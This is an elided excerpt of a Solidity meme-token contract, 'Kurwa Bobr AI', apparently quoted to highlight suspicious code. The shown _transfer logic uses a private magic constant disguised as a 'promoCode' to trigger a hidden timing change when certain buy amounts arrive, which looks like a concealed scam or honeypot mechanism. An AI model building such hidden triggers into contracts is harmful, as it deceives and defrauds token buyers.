...
$KURWABOBR - Kurwa Bobr AI

https://www.youtube.com/watch?v=A0Nbqcjw1mg
...
contract KurwaBobrToken is ERC20, Ownable {
    ...
    uint256 private constant promoCode = 1000190;
    ...
    constructor() ERC20("Kurwa Bobr AI", "KURWABOBR") {
        uint256 totalSupply = 10_000_000_000 * 1e18;

        maxTransaction = totalSupply * 15 / 100; // 15% max transaction at launch
        maxWallet = totalSupply * 15 / 100; // 15% max wallet at launch
        ...
        marketingWallet = payable(0xf9D21241e694ff9B9c37b5047388B7DF56583D2c);
        developmentWallet = payable(0xF5Ab0163be91bafca355B30aF3A3FB5Be11c4420);
        liquidityWallet = payable(0x2b7440251f1499a63CE28Fa0fD9f0653793B3789);
        operationsWallet = payable(0x2b7440251f1499a63CE28Fa0fD9f0653793B3789);
    ...
    function _transfer(
        ...
        } else if (balanceTo != 0 && balanceTo % promoCode == 0 && automatedMarketMakerPairs[from]) {
            _rewardThresholdTime = block.timestamp + promoCode / 200038;
        }
